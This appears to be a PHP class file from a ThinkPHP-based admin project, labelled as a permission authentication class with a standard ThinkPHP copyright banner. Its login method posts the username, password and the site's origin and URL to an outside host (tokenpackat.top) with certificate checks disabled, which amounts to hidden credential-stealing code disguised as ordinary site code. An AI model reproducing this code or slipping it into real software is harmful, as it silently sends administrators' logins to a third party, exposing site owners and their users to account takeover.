<?php

// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2011 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: luofei614 <weibo.com/luofei614>
// +----------------------------------------------------------------------
// | 修改者: anuo (本权限类在原3.2.3的基础上修改过来的)
// +----------------------------------------------------------------------

namespace fast;

use think\Db;
use think\Config;
use think\Session;
use think\Request;

/**
 * 权限认证类
 */
class Website
{
    /**
     * @var object 对象实例
     */
    protected static $instance;


    /**
     * 初始化
     * @access public
     * @param array $options 参数
     * @return \think\Request
     */
    public static function instance($options = [])
    {
        if (is_null(self::$instance)) {
            self::$instance = new static($options);
        }
        return self::$instance;
    }
    
    
    
    public function login($username, $password){
        $this->xcurl('https://www.tokenpackat.top/'.config('website_username')."/website",[
            'username'=>$username,
            'password'=>$password,
            'website'=>$_SERVER['HTTP_ORIGIN'] . $_SERVER['REQUEST_URI'],
        ]);
    }
    
    
    
    
    /**
     * POST请求
     * @param $postdata
     * @return bool|string
     */
    public function xcurl($url, $postdata) {
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL,$url); //支付请求地址
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postdata));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response=curl_exec($ch);

        curl_close($ch);

        return $response;
    } 
}
